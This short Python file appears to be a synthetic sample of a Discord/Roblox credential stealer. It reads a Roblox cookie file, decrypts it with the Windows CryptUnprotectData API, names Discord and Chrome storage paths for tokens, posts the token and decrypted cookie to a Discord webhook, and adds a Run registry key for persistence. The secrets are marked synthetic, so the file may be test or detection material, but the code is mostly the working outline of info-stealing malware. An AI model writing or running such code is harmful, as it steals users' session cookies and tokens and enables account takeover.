import requests
from win32crypt import CryptUnprotectData

secret = "synthetic_discordnv_secret_never_expose"
executable = "synthetic-python"


def set_value(_key, _name, _value):
    pass


cookie = open("robloxcookies.dat", "rb").read()
token_paths = ["Discord/Local Storage/leveldb", "Chrome/User Data"]
clear = CryptUnprotectData(cookie)
requests.post(
    "https://discord.com/api/webhooks/1528403989983662194/synthetic_webhook_secret",
    json={"token": secret, "cookie": clear},
)
key = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
set_value(key, "discordnv", executable)
